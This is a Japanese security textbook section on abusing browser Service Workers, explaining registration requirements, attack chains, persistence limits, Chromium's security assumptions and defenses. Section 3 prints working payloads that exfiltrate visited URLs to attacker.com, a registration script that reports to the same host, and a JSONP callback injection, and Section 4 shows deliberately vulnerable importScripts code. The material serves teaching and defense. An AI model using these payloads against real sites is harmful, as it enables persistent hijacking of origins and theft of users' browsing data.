# Service Worker の悪用とChromiumが置く前提

> **この節で分かること**
> - Service Worker（SW）がなぜ強力な攻撃基盤になるのかを、その設計目的と仕組みから説明できる
> - 攻撃者がSWを登録するために「XSS単独では足りない」理由と、必要になる追加の足がかりを説明できる
> - `fetch` イベント乗っ取り・`importScripts` によるCSP回避・DOM Clobbering を組み合わせた攻撃の流れを追える
> - 悪性SWがどれだけ残存し、どう消せるのか（TTL短縮・kill-switch・`Clear-Site-Data`）を自分で説明できる
> - ChromiumがSWに置いているセキュリティ前提（同一オリジン・セキュアコンテキスト・権限・寿命）と、そのどこがVRP報奨対象になるかを列挙できる

**元資料**:
- HackTricks「Abusing Service Workers」 — https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers （原典取得済み。HackTricks公式GitHub原本Markdownより全文取得）
- Chromium「Service Worker Security FAQ」 — https://chromium.googlesource.com/chromium/src/+/main/docs/security/service-worker-security-faq.md （原典取得済み。Chromium公式GitHubミラー原本より全文取得。最終更新 2017年5月12日）

**関連する節**: DOM Clobbering、CSP（Content Security Policy）、Same-Origin Policy と Site Isolation

---

## 1. Service Worker とは何か（なぜ存在するのか）

### 1.1 まず一言でいうと

Service Worker（サービスワーカー、以下SW）とは、任意のWebページとは独立して、**ブラウザがバックグラウンドで実行するスクリプト**のこと。Webページの表示やユーザー操作を必要としない処理を担い、**オフライン処理・バックグラウンド処理**の能力をWebアプリに与える。

たとえば地下鉄の中で電波が切れても、いったん読み込んだニュースアプリの記事一覧が見えたり、書きかけのメールが保存できたりする。この「ネットが不安定でも動くWebアプリ」を支えているのがSWである。

### 1.2 なぜこの機能が作られたのか（設計意図）

Chromiumのセキュリティドキュメントは、SWの存在意義を次のように説明している。SWは、オフラインや断続的な接続でも動く魅力的なWebアプリ（ドキュメント編集、カタログ閲覧・購入、SNS投稿、メール作成など）を可能にする。狙いは、**Webプラットフォームをネイティブアプリと競争できるようにしつつ**、Open Web Platform（OWP）が持つ「browse-to-use（開けばすぐ使える）」でサンドボックス化された性質を本質的に保つことにある。

SWは、以前から存在した古い **Application Cache API**（アプリケーションキャッシュ）の**置き換え・改良**として設計された。つまりSWは、まったく新しい危険物ではなく、既存のオフライン機能をより制御しやすい形に作り直したもの、という位置づけである。

### 1.3 なぜ攻撃者にとって強力なのか（ここが本題）

SWは実質的に**ネットワークプロキシ**として機能する。いったんあるオリジンにSWが登録されると、そのSWの有効範囲（scope）配下のページから発生する**あらゆる `fetch`**——ページ遷移（ナビゲーション）、画像やスクリプトなどのサブリソース、XHR/fetch API——が、SWの `fetch` イベントを経由しうる。

> **オリジン（origin）とは**、`https://example.com:443` のように「スキーム（http/https）＋ホスト名＋ポート」の組で決まる、ブラウザがセキュリティ境界として扱う単位のこと。同じオリジンかどうかで「触ってよいデータ」が変わる。

このため、攻撃者が脆弱なドメインの中にSWを登録できると、**そのドメイン配下の全ページに対する被害者のやり取りを制御下に置ける**。ページを1回だけ書き換えるXSSと違い、SWは**そのオリジンに対する永続的（persistent）な制御**を攻撃者に与える。ここがSWをバグハンティングで重要にしている点である。

---

## 2. SWの確認とプッシュ通知（攻撃前の下見）

### 2.1 既存のSWをどこで見るか

診断でも防御でも、まず「今このオリジンにどんなSWが登録されているか」を見ることになる。Chromium系ブラウザでは2通りある。

- **Chrome DevTools の Application パネル**の「Service Workers」セクション。ここからSWの検査（inspect）・更新（update）・停止（stop）・登録解除（unregister）ができる。
- **`chrome://serviceworker-internals`**。Chromiumが公開している、登録のグローバルな低レベルビュー。全オリジンのSW登録を一覧・削除できる。

```text
確認できる場所の対応
┌───────────────────────────────┬───────────────────────────┐
│ DevTools → Application →       │ 特定オリジンのSWを検査/更新/  │
│   Service Workers             │ 停止/解除                   │
├───────────────────────────────┼───────────────────────────┤
│ chrome://serviceworker-       │ 全オリジンの登録を一覧・削除   │
│   internals                   │ ステータス(RUNNING/STOPPED等) │
├───────────────────────────────┼───────────────────────────┤
│ DevTools → Application →       │ SWが植えた悪性レスポンス      │
│   Cache Storage               │ キャッシュを確認・削除        │
└───────────────────────────────┴───────────────────────────┘
```

### 2.2 プッシュ通知の許可がなぜ効くのか

**プッシュ通知の許可（Push notification permissions）**は、SWがユーザーの直接操作なしにサーバーと通信する能力に直接影響する。

- 許可が**拒否**されていれば、SWが継続的な脅威になり続ける余地は制限される。
- 逆に許可を**付与**すると、潜在的なエクスプロイトの受信・実行を可能にし、リスクが増える。

なぜかというと、プッシュ通知の許可を得たSWは、**ユーザーがサイトを訪れていなくても、タブを閉じていても**、サーバからのpushメッセージをきっかけに `push` イベントで起動できるからである。これがSWによる「永続化（persistence）」を成立させる主要な経路になる。

ただし後述するChromiumの前提により、pushには明示的なユーザー許可が必須で、SWが自分で通知を作らなければブラウザがユーザーに見える通知を出す。つまり「ユーザーに気づかれない静かな永続化」はブラウザ側で抑止されている。

---

## 3. 攻撃：SWの作成と登録

### 3.1 なぜXSS単独ではSWを登録できないのか

ここが最重要ポイントである。SWは強力だが、**XSSがあるだけでは登録できない**。ブラウザがSW登録に次の条件を課しているためである（詳細は第6節）。

- SWスクリプトが**同一オリジンから配信**されていること
- **正しいJavaScript MIME type**（`text/javascript` 等）を持つこと
- **セキュアコンテキスト（HTTPS または localhost）**であること

XSSは「そのページ上でJSを走らせる」能力だが、「そのオリジンから任意のJS本文を返すURL」を用意する能力とは別物である。だから攻撃者は、次のいずれかの**追加の足がかり**を見つける必要がある。

- **任意のJSファイルをサーバーにアップロードする方法** ＋ そのJSをSWとして読み込ませる **XSS**。
- **出力を操作できる（任意JSコードを含められる）脆弱なJSONPリクエスト** ＋ そのJSONPをペイロード付きで読み込ませ、**悪性SWを登録させる XSS**。

> **JSONP（JSON with Padding）とは**、`?callback=関数名` のようにコールバック関数名をURLで指定すると、サーバがその名前を使って `関数名({...データ...})` という**JavaScriptそのもの**を返す古いAPI方式のこと。返り値がJSとして解釈されるため、callback部分に細工が反射されると任意JSの配信手段になりうる。

### 3.2 `fetch` を乗っ取るSW本体

次のSWは `fetch` イベントを監視し、**リクエストされた各URLを攻撃者サーバに送信**する。これを脆弱なオリジンにアップロードするか、脆弱なJSONPエンドポイントから返させる。

```javascript
self.addEventListener("fetch", (event) => {
  event.waitUntil(
    fetch("https://attacker.com/fetch_url/" + encodeURIComponent(event.request.url), {
      mode: "no-cors",
    }).catch(() => {}),
  )
  event.respondWith(caches.match(event.request).then((response) => response || fetch(event.request)))
})
```

このコードの各部分は次を意味する。

- `event.waitUntil(...)`：SWの寿命を、この非同期処理が終わるまで延長する。
- `fetch("https://attacker.com/fetch_url/" + encodeURIComponent(event.request.url), { mode: "no-cors" })`：被害者がアクセスした**各URLを攻撃者サーバへ漏えい**する。`mode: "no-cors"` によりクロスオリジン送信のCORSエラーを回避する（レスポンスは読めないが、送信自体は成立する）。`.catch(() => {})` で送信失敗を握りつぶす。
- `event.respondWith(caches.match(event.request).then((response) => response || fetch(event.request)))`：**Cache API** に一致があればそれを返し、なければ本来の `fetch` を返す。ここが**レスポンス改変（response tampering）**の足場になる。

`event.respondWith(...)` に攻撃者が作った `new Response("<悪性HTML/JS>", {...})` を渡せば、ナビゲーションやサブリソースの**レスポンス本文を丸ごと差し替えられる**。さらに `caches`（Cache API）は `caches.open(name)` → `cache.put(request, response)` でオリジン単位に永続的な応答キャッシュを持てるので、攻撃者は悪性レスポンスをキャッシュに植え付けて配信し続けられる。

### 3.3 SWを登録する側のコード（XSSで実行する部分）

これが**ワーカーを登録するコード**である。XSSで実行できるべきコードであり、この例ではSW登録の成否を攻撃者サーバにGETで通知する。

```html
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
  .then(function(registration) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/success", true);
    xhttp2.send();
  }, function (err) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/error", true);
    xhttp2.send();
  });
});
</script>
```

- `var sw = "/uploaded/ws_js.js";`：同一オリジン上にアップロード済みのSWスクリプトのパス。
- `navigator.serviceWorker.register(sw, {scope: '/'})`：SWを**scope `/`（オリジン全体）**で登録する。これで scope 配下の全ページの `fetch` を横取りできる。
- 成功時 `https://attacker.com/SW/success`、失敗時 `https://attacker.com/SW/error` にGETで通知する。

〔補足〕`{scope: '/'}` でオリジン全体を横取りするには、**SWスクリプトのパスが scope 以上の階層にある**必要がある。スクリプトが `/uploaded/ws_js.js` にあると、既定の最大 scope は `/uploaded/` に制限される。これを `/` まで広げるには、SWスクリプトの応答に `Service-Worker-Allowed: /` レスポンスヘッダを付ける必要がある（第7節で扱う）。HackTricks原文のこの例は、SWスクリプトを適切な scope で配信できる前提で `{scope: '/'}` を指定している。

### 3.4 JSONPエンドポイントを悪用する場合

脆弱なJSONPエンドポイントを使う場合は、`var sw` の値にJSONPのURLを入れる。

```javascript
var sw =
  "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//"
```

- JSONPの `callback` パラメータに反射されるコードを使い、SWスクリプトとして解釈できるJS（`onfetch = function(e){ ... }`）を**そのオリジンから返させる**。
- 末尾の `//` で、JSONP応答の余計なトークンを行コメント化して無効化する。
- これにより「同一オリジンから正しいJSを返す」というSW登録要件を満たしつつ、`fetch` ハンドラを注入できる。

### 3.5 Shadow Workers（攻撃フレームワーク）

**Shadow Workers** は、Service Worker のエクスプロイトに特化した **command-and-control（C2、指令サーバ）フレームワーク**である（`https://shadow-workers.github.io`）。XSSで注入したSWを介して被害者ブラウザをC2に接続させ、被害オリジンのトラフィック傍受・クレデンシャル窃取・レスポンス改変などをオペレータのコンソールから操作できる。あくまで教育・許可された検証用途のツールである。

> ### 📌 ここは自分で開いて読んでください
> **資料**: HackTricks「Abusing Service Workers」 — https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の egress 制限で 403 ブロック。内容自体は HackTricks 公式GitHub原本 `HackTricks-wiki/hacktricks/.../abusing-service-workers.md` から全文取得済み）。以下の記述はその原本Markdownにもとづく。
> **読みどころ**:
> 1. 「Attack Creating a Service Worker」節のPoC 3点（`fetch` 乗っ取りSW本体、`navigator.serviceWorker.register` の登録スクリプト、JSONP悪用時の `var sw` 値）を実コードで確認する。
> 2. 「Abusing `importScripts` in a SW via DOM Clobbering」の `index.html`/`sw.js` 脆弱コード例と、CSP回避が成立する理由。
> 3. 参考文献[1] PortSwigger「Hijacking service workers via DOM Clobbering」への導線（DOM Clobbering×SWの実例）。
> 4. Shadow Workers（`shadow-workers.github.io`）というSW悪用C2フレームワークの存在。
> 5. 同リポジトリの `dom-clobbering.md` でDOM Clobberingの前提を補完する。
> **代替手段**: HackTricks公式GitHub原本 https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md （無料で全文読める）

---

## 4. `importScripts` と DOM Clobbering によるCSP回避

### 4.1 `importScripts` がなぜ危険か

SWから呼び出せる **`importScripts`** 関数は、**別ドメインからスクリプトをインポート**できる。この関数が**攻撃者が改変できるパラメータ**で呼ばれると、攻撃者は**自ドメインのJSをインポート**してXSSを得られる。

そして重要なのは次の一文である。**これはCSP保護すら回避する（This even bypasses CSP protections.）。**

なぜCSPを回避できるのか。`importScripts()` はワーカーコンテキストのAPIで、指定URL（クロスオリジン可）のスクリプトを同期的にフェッチして現在のワーカーグローバルで実行する。ドキュメントの `<script>` に効くCSP（`script-src`）は、ワーカー内の `importScripts` を直接は制限しない。ワーカーに効くCSPは、**SWスクリプト応答の `Content-Security-Policy` レスポンスヘッダ**で別途指定する必要がある。だから、SWスクリプト応答にCSPが設定されていないと、`importScripts` の引数汚染がそのままCSP迂回の任意スクリプト実行になる。

### 4.2 脆弱なコード例

```html
<script>
  navigator.serviceWorker.register(
    "/dom-invader/testcases/augmented-dom-import-scripts/sw.js" +
      location.search
  )
  // attacker controls location.search
</script>
```

```javascript
const searchParams = new URLSearchParams(location.search)
let host = searchParams.get("host")
self.importScripts(host + "/sw_extra.js")
//host can be controllable by an attacker
```

- 登録URLに `location.search`（攻撃者が制御できるクエリ文字列）を連結している。
- SW内で `host = searchParams.get("host")` を取り、`importScripts(host + "/sw_extra.js")` で外部スクリプトを読み込む。`host` を攻撃者が制御できれば、攻撃者ドメインの `sw_extra.js` を読み込ませてXSS（CSP回避）に至る。

### 4.3 DOM Clobbering との組み合わせ

> **DOM Clobbering（DOMクロバリング）とは**、`id` や `name` 属性を持つHTML要素が、同名のグローバル変数や `document.<name>` を上書きできてしまうブラウザの挙動を悪用する手法のこと。`<script>` タグを使わずにHTMLを注入するだけで、JS変数の値を差し替えられるのでCSPを回避しやすい。

SWが `importScripts` に使うURL/ドメインが**HTML要素の中にある**場合、DOM Clobbering によってそれを改変し、SWに**攻撃者のドメインからスクリプトを読み込ませる**ことができる。たとえばSWが `window.config.url` のようなDOM由来の値を `importScripts` に渡す実装だと、HTMLインジェクションだけでその値を攻撃者URLに差し替えられる。具体例はPortSwigger Research「Hijacking service workers via DOM Clobbering」を参照。

```text
攻撃チェーンの全体像
 XSS または HTMLインジェクション
        │
        ├─(A) 任意JSアップロード ──┐
        ├─(B) JSONP callback反射 ──┤→ 同一オリジンから正しいMIMEのJSを返せる
        └─(C) DOM Clobbering ──────┘   （＝SW登録要件を満たす）
                                        │
                                        ▼
                         navigator.serviceWorker.register()
                                        │
                          ┌─────────────┴─────────────┐
                          ▼                           ▼
                fetch イベント乗っ取り        importScripts で外部JS
                （URL漏えい/応答改変）        （CSP回避で任意実行）
                          │
                          ▼
                    オリジンの永続的制御
```

---

## 5. 悪性SWはどれだけ残るか（残存時間と除去）

### 5.1 「更新チェックは24時間ごと」だが消える保証ではない

SWの更新チェックは、前回の fetch が**24時間より前**に発生していた場合、**ブラウザのキャッシュをバイパス**する。しかしこれは、悪性ワーカーが24時間以内に必ず消えることを**保証しない**。変更後のスクリプトが fetch・install・activate されるまで、**古いワーカーはアクティブなまま残り続けられる**からである。

### 5.2 防御：TTL短縮と kill-switch

したがって運営者側の防御は次のようになる。

- ワーカースクリプトに**短いキャッシュ有効期間（TTL, Time To Live）**を設定し、更新が速く反映されるようにする。
- **自身を unregister し、悪性キャッシュをクリアする kill-switch（緊急停止用）ワーカーをデプロイ**する。

〔補足〕SWの更新は `registration.update()` でも強制でき、ブラウザは24時間ごと・ナビゲーション時にも自動で更新チェックする。バイト差分があれば新SWが install → 旧SW制御下のクライアントが無くなった時点で activate される。`self.skipWaiting()` と `clients.claim()` を使えば即時に制御を奪える。解除は `registration.unregister()`、DevTools の Application パネル、`chrome://serviceworker-internals`、ブラウザデータのクリア、`Clear-Site-Data` ヘッダのいずれでも可能である。

---

## 6. ChromiumがSWに置いているセキュリティ前提

ここからは Chromium の「Service Worker Security FAQ」（2017年5月12日最終更新）にもとづき、ブラウザがSWをどう安全側に縛っているかを見る。攻撃者はこれらの前提の「穴」を突き、防御者はこれらを頼りにする。

### 6.1 SWはサンドボックス内で動く

**SWはレンダラプロセス（renderer processes）内で動作する。** ChromeがSWを起動するとき、SWのオリジンに関連付けられたレンダラプロセスを選ぶ。無ければ、そのオリジン用に新しい **`SiteInstance`**（`content/public/browser/site_instance.h`）を使って新規プロセスを作る。

〔補足〕これは Site Isolation の一部で、SWはそのオリジン専用のプロセスに割り当てられ、他サイトのメモリに直接触れない。クロスサイトのSWは別プロセスに置かれ、Spectre のようなサイドチャネルを含む越境を難しくする。

### 6.2 SWがアクセスできるAPIは限定的

- HTML仕様が「Workersが利用可能なAPI表面」を部分的に列挙している（`https://html.spec.whatwg.org/#apis-available-to-workers`）。
- **注意：SWは同期API（synchronous APIs）にアクセスできない。**
- SWはWebプラットフォームAPIの**サブセット**にアクセスでき、加えてワーカー／SW固有のAPIを持つ。`[Service]WorkerGlobalScope` は必ずしも `Window` の厳密なサブセットではなく、`WorkerNavigator` も `Navigator` の厳密なサブセットとは限らない。

### 6.3 SWは同一オリジンポリシーに従う

> **同一オリジンポリシー（Same-Origin Policy, SOP）とは**、あるオリジンのページが別オリジンのデータを勝手に読めないようにする、ブラウザの基本的なセキュリティ規則のこと。

- SW登録の仕様は、**SWが呼び出し元と同一オリジンで動作しなければならない**と定めている。
- リクエストに対するSW登録の**オリジン比較**は、**パスを含むシリアライズ済みURLの最長前方一致（longest-prefix match）**として仕様化されている。たとえば `https://example.com/` は `https://example.com.evil.com/` と一致しない。この「パス前方一致」という仕様上の緩さは脆弱に見え、本来は**オリジン等価（origin equality）として定義し直すべき**とされている（w3c/ServiceWorker#1118）。ただし現時点で悪用可能には見えないとされる。
- **セキュアコンテキストのみがSWを登録・使用できる。** セキュアコンテキストとは、HTTPSで配信されたページ、または `http://localhost` / `127.0.0.1` / `::1` などローカル扱いのホストのこと。平文HTTP（localhost以外）ではSWを登録できない。
- SWは任意の他オリジンからも `importScripts` できるので、運営者は**SWのJavaScript応答に `Content-Security-Policy` レスポンスヘッダを設定**し、信頼するスクリプトのソースをブラウザに指示すべきである。これでXSS攻撃者が自分のコードを引き込む能力を減らせる。

### 6.4 SWは永遠には生きない

「live（生きている）」には2つの概念がある。**インストール済みの登録（registration）**と、**実行中のSWスレッド**である。

| 項目 | Chromiumの規定 |
|---|---|
| インストール済み登録 | 無期限に持続（IndexedDB等のオリジンスコープのストレージと同様） |
| 更新チェック | SWを使うナビゲーション後に実施し、**24時間ごと**にHTTPキャッシュを無効化 |
| 更新チェックの間隔 | 直近 **86,400秒（＝24時間）** にチェックしていなければ実施（Handle Functional Event アルゴリズム） |
| アイドル終了 | SWが**30秒アイドル**なら終了 |
| 長時間イベントの終了 | イベントの決着に**5分以上**かかると終了 |
| 応答なしの終了 | 同期JS実行中で**pingに30秒以内**に応答しないと終了 |
| 停止時の表示 | DevTools と `chrome://serviceworker-internals` で **STOPPED** |
| 例外 | **Payment Handler** として登録されたSWは、その payment handler ウィンドウが開いている限り実行を継続しうる |

### 6.5 タブを閉じた後も動くか

- あるオリジンにSWが動いていても、各ワーカーは**最後のイベントを処理した直後にシャットダウン**される。
- ワーカーを生かし続けられるイベントには**プッシュ通知**が含まれる。
  - プッシュ通知でSWが通知を作らなければ、**ブラウザがユーザーに見える通知を自動生成**する（`push_messaging_notification_manager.cc`）。
  - プッシュ通知は**プロンプトでオリジンに許可を付与すること**を要する。

### 6.6 「登録後に開発された攻撃」をSWで撃てるか

想定シナリオは「攻撃者が今ユーザーを悪性サイトに訪問させ、後日ChromeのV8バグが出たらエクスプロイトを書き、過去に訪れた全員のマシンで実行できるか」である。答えは実質ノーで、理由はこうである。

- **ユーザーの明示的許可なしには、ブラウザはSWに攻撃者サーバの push イベントを受信させない**ため、SWはイベントを処理する機会を得られない。
- `importScripts` で `maybe-v8-payload.js` を定期的に再読み込みするSWも想像できるが、それは**イベントハンドラの一部としてしか実行できない**。ユーザーが attacker.com を閲覧せず、push許可も与えていなければ、SWはイベントを一切受け取れず、攻撃の機会がない。
- そもそもユーザーが今 attacker.com を閲覧しているなら、SWから追加の利益はない。ページ内JSで普通に `<script src="maybe-v8-payload.js">` を実行すればよいだけである。

### 6.7 XSSがあればオリジンを永続的に侵害できるか

- **XSS攻撃者は確かに悪性SWを登録できる。** SW以前からXSSはWebオリジンに対する非常に強力な攻撃だった。
- リスク緩和のため、ブラウザは**SW登録URLがそのオリジン自身から来ること**を要求する。だからXSSで悪性SWを登録するには、攻撃者は**自分のスクリプトをサーバー上にホストする追加能力**が必要になる。
- XSS脆弱ページに**JSONPエンドポイント**もあると、攻撃者はそれで（1）**CSPをバイパス**し、（2）**SWを登録**し、（3）`importScripts` でサードパーティスクリプトをインポートし、次の時点まで**永続化**できる。
  - サイト運営者が問題を検知・修正するまで、かつ
  - ユーザーがオンラインで再度サイトにアクセスするまで。
- ただし **24時間のキャッシュ指令の上限**により、悪性SWがXSS修正を生き延びるのは（クライアントがオンライン前提で）**最大24時間**に保証される。運営者はSWスクリプトに**低いTTL**を設定して脆弱性ウィンドウを縮められる。開発者には **kill-switch SW** の構築が推奨される。
- 正しいクリーンアップ戦略は **Clear-Site-Data**（`https://www.w3.org/TR/clear-site-data/`）。
- さらに運営者は、SWスクリプトを配信する想定がないドメイン/パスに対し、**`Service-Worker` リクエストヘッダを持つリクエストを無視すべき**（例：`400 Bad Request` で応答）。

### 6.8 その他の前提（MIME・iframe・確認しない理由）

- **JPEG等の非スクリプトMIMEにSWを隠せるか**：不可。SW仕様・実装は、SWスクリプトが**正しいJavaScript MIME type**（`text/javascript` 等）を持つことを要求する。`image/jpeg` や `text/plain` で返るファイルはSWとして登録できない。これが「アップロードJSでのSW登録」に画像偽装を使えない理由である。
- **iframe はSWを登録できるか**：Yes、ただし**そのiframe自身がセキュアコンテキスト**である場合に限る。トップレベルまで全ての親がセキュアコンテキストでなければならない。そして**サードパーティiframeが登録したSWは、そのオリジンに加えてトップレベルサイトでパーティション化（partitioned）される**。サードパーティCookieがブロックされていても同様である。これにより、`a.com` 内の `tracker.com` iframe のSWと、`b.com` 内の同じ `tracker.com` iframe のSWが別パーティションに分離され、クロスサイトのSW経由トラッキングを防ぐ。
- **なぜ登録前に確認しないのか**：Chromeチームは、カメラ・マイク・位置情報のように単純で正確に表せるプライバシー事項はユーザーに尋ねるが、**リソース利用（キャッシュ・永続化・CPU）については尋ねない**方針である。これらは自動判断の方が適する（HTTPキャッシュも過去のGoogle Gearsも尋ねなかった）。また、iframe内オリジンのAPI呼び出しで出る許可要求を人々は十分理解できない、という非公式調査もある。
- **SWを一切望まない場合**：ブラウザデータのクリア（`chrome://settings/clearBrowserData`）がSWも削除する。個別の登録は `chrome://serviceworker-internals/` からも削除できる。

### 6.9 どんなSWバグがChrome VRPの報奨対象か

Chromiumはこのドキュメントで示した**セキュリティ表明のいずれかを破れれば、VRP（脆弱性報奨金）の対象になりうる**としている。非網羅的な例（原文のまま）。

```text
*  Over-long registration/lifetime（例: 処理すべき着信イベントなしに実行/生存し続けられるSW）
*  Same-origin bypass または off-origin SW registration
*  プロンプト/チューザ/許可を要するAPIへの、オリジンに許可が付与されていない状態でのアクセス:
     *  Geolocation（位置情報）
     *  Hardware sensors（ハードウェアセンサ）
     *  Microphone, camera, media devices（マイク・カメラ・メディアデバイス）
     *  USB, Bluetooth
```

過去のSWセキュリティバグ一覧はChromiumバグトラッカー（`bugs.chromium.org` の `Type=Bug-Security serviceworker` クエリ）にある。バグを見つけたらSecurityテンプレートで起票する。良い報告は問題を示す最小テストケースを伴う。Chrome Security Team は1〜2営業日でトリアージする。

> ### 📌 ここは自分で開いて読んでください
> **資料**: Chromium「Service Worker Security FAQ」 — https://chromium.googlesource.com/chromium/src/+/main/docs/security/service-worker-security-faq.md
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の egress 制限で 403 ブロック。内容自体は Chromium 公式GitHubミラー原本から全文取得済み）。以下の記述はその原本Markdown（2017年5月12日更新）にもとづく。
> **読みどころ**:
> 1. 「Do Service Workers obey the same-origin policy?」— scope比較がパス最長前方一致である仕様の緩さ（w3c/ServiceWorker#1118）と、Secure Context必須、`importScripts` とCSPヘッダの関係。
> 2. 「Do Service Workers live forever?」— 24時間更新チェック / 86,400秒 / 30秒アイドル終了 / 5分イベント上限 / 30秒ping の各数値と Payment Handler 例外。
> 3. 「If a site has an XSS vulnerability...」— XSS+JSONPでCSP回避・SW登録・`importScripts` 永続化の連鎖と、最大24時間の残存保証、`Clear-Site-Data`・`Service-Worker` ヘッダ拒否の防御。
> 4. 「Can iframes register Service Workers?」— サードパーティiframeのSWがトップレベルサイトでパーティション化される点。
> 5. 「What SW bugs would qualify for a bounty under Chrome's VRP?」— 報奨対象のセキュリティ表明。
> **代替手段**: Chromium公式GitHubミラー原本 https://github.com/chromium/chromium/blob/main/docs/security/service-worker-security-faq.md （無料で全文読める）

---

## 7. 攻守で押さえるべき補助ヘッダとAPI

原文で断片的に触れられた、登録条件を左右する要素を整理する。

### 7.1 登録の3条件（まとめ）

1. **セキュアコンテキスト（HTTPS または localhost）**でのみ登録できる。
2. **SWスクリプトは登録元と同一オリジンから配信**され、**正しいJavaScript MIME type**を持つ。
3. **scope（有効範囲）**は既定でSWスクリプトのパスのディレクトリ配下に制限される。

### 7.2 `Service-Worker-Allowed` レスポンスヘッダ

〔補足〕SWスクリプトの応答にこのヘッダを付けると、`register(url, {scope})` で指定できる**最大 scope をスクリプトのパスを超えて広げられる**。例：`/js/sw.js` を配信する応答に `Service-Worker-Allowed: /` を付ければ `{scope: '/'}` が許可される。ヘッダが無いと `/js/sw.js` の既定最大 scope は `/js/` に制限される。攻撃視点では、アップロード先が深いパスでも、このヘッダを攻撃者が制御できればオリジン全体を横取りする scope に広げられる。

### 7.3 `Service-Worker` リクエストヘッダ

〔補足〕ブラウザはSWスクリプトを取得する際、そのリクエストに `Service-Worker: script` ヘッダを付ける。運営者はこれを見て、SW配信を意図しないパスでは `400` 等で拒否できる。診断でも、アップロードエンドポイントにこのヘッダ付きでアクセスして拒否されるかを確認できる。

### 7.4 foreign fetch は廃止済み

〔補足〕かつて実験的に「foreign fetch」（他オリジンのリクエストにサードパーティSWが応答できる仕組み）が提案・実装された（Chrome 54付近のOrigin Trial）が、**セキュリティ/複雑性の懸念から廃止・削除**された。現行仕様に foreign fetch は存在せず、SWの `fetch` イベントは**自オリジン（自scope）配下のリクエストにのみ**適用される。クロスオリジンの他者リクエストを横取りする正規手段はない。

---

## 手を動かす

以下は**自分で立てた検証環境、または許可されたバグバウンティ対象**でのみ行うこと。

1. ローカルにHTTPSまたは `http://localhost` の検証サイトを立てる（SWはセキュアコンテキスト必須のため）。
2. ブラウザで対象サイトを開き、DevTools を起動して **Application → Service Workers** を開く。既存のSWが登録されているか確認する。
3. 別タブで `chrome://serviceworker-internals` を開き、全登録の一覧とステータス（RUNNING / STOPPED / REDUNDANT）を確認する。
4. 検証用の最小SW（`self.addEventListener("fetch", ...)` で `console.log` するだけのもの）を同一オリジンに置き、DevTools のコンソールで次を実行して登録する。
   ```javascript
   navigator.serviceWorker.register("/sw-test.js", {scope: "/"})
     .then(r => console.log("registered", r.scope))
     .catch(e => console.log("error", e));
   ```
5. `/sw-test.js` を深いパス（例 `/uploaded/sw-test.js`）に置き、`{scope: "/"}` で登録が**失敗する**ことを確認する。次に応答に `Service-Worker-Allowed: /` を付けて再試行し、成功に変わることを確認する（scope の仕組みを体感する）。
6. SWの応答MIME type を `text/plain` にして登録を試み、**失敗する**ことを確認する（MIME要件の確認）。
7. DevTools → Application → **Cache Storage** で、SWが植えたキャッシュを確認・削除する。
8. `chrome://settings/clearBrowserData` でブラウザデータをクリアし、`chrome://serviceworker-internals` をリロードしてSWが REDUNDANT / STOPPED を経て消えることを確認する。
9. 防御の確認として、SW配信を意図しないアップロードパスに対し、サーバ側で `Service-Worker` リクエストヘッダを検出して `400` を返す設定を入れ、SW登録が拒否されることを確認する。

## つまずきポイント

- **XSSがあればすぐSWを登録できる、と思い込む**。実際にはXSS単独では足りない。「同一オリジンから正しいMIMEのJSを返せる能力」（任意アップロード / JSONP反射 / DOM Clobbering）が別途必要である。
- **scope を勘違いする**。SWスクリプトのパスより浅い scope は既定では取れない。`Service-Worker-Allowed` ヘッダが無いと `/uploaded/` 配下のSWで `{scope: '/'}` は失敗する。
- **CSPがあればSWのXSSは防げる、と思う**。ページのCSPはSW内の `importScripts` を直接制限しない。SWに効くCSPは**SWスクリプト応答のレスポンスヘッダ**で指定しない限り、`importScripts` の引数汚染でCSPを回避される。
- **HTTPで試して登録できないと悩む**。SWはセキュアコンテキスト（HTTPS / localhost）必須。平文HTTPのlocalhost以外では登録できない。
- **「24時間で悪性SWは必ず消える」と誤解する**。24時間はキャッシュ指令の上限であり、更新スクリプトが fetch/install/activate されるまで古いワーカーは残りうる。確実に消すには kill-switch SW や `Clear-Site-Data` が要る。
- **JPEGにSWを隠せると考える**。正しいJavaScript MIME type が必須なので、画像MIMEのファイルはSWとして登録できない。
- **サードパーティiframeのSWでクロスサイト追跡できると考える**。SWはトップレベルサイトでパーティション化されるため、サイトをまたいだ共有はできない。

## この節のまとめ

- Service Worker（SW）は、ページと独立にブラウザが動かすバックグラウンドスクリプトで、実質ネットワークプロキシとして scope 配下の全 `fetch` を横取りできる。
- SWは古い Application Cache API の改良として設計され、オフライン対応でWebをネイティブアプリに近づけつつ、サンドボックス性を保つのが狙いである。
- 攻撃者がSWを登録できると、そのオリジンに対する**永続的な制御**を得る（1回きりのXSSより深刻）。
- SW登録には（1）同一オリジン配信、（2）正しいJS MIME type、（3）セキュアコンテキスト、が必須で、これがXSS単独での登録を阻む防御になっている。
- 典型攻撃は「任意JSアップロード＋XSS」または「JSONP反射＋XSS」で、`fetch` を乗っ取りURLを漏えい・レスポンスを改変するSWを登録する。
- `importScripts` は任意オリジンからスクリプトを読み込め、SWスクリプト応答にCSPが無ければ**CSPを回避**する。引数を攻撃者が制御でき（DOM Clobbering含む）ると外部の悪性JSを実行できる。
- 悪性SWの残存は、XSS修正後（オンライン前提で）**最大24時間**に保証されるが、更新スクリプトが activate されるまで古いワーカーは残りうる。
- 防御は、SWスクリプトの低TTL、kill-switch SW、`Clear-Site-Data`、SW非配信パスでの `Service-Worker` ヘッダ拒否、SW応答へのCSPヘッダ付与。
- Chromiumの前提：SWはレンダラプロセスのサンドボックス内で動き、同一オリジンポリシーに従い、同期APIやWebプラットフォームAPIの一部にしかアクセスできない。
- SWの寿命は、登録は無期限だが実行スレッドは短命（30秒アイドルで終了、5分イベント上限、30秒ping、24時間更新チェック、Payment Handler は例外）。
